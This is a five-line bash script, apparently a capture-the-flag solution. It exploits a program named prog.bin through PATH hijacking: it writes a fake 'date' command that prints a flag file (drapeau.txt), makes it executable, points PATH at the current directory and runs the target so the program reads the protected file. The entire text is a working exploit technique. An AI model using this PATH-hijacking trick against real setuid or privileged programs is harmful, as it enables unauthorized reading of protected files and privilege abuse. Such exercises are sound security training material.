 #!/bin/bash
echo /bin/cat drapeau.txt >| date
chmod +x date
export PATH=$PWD
echo -n "1\n" | ./prog.bin
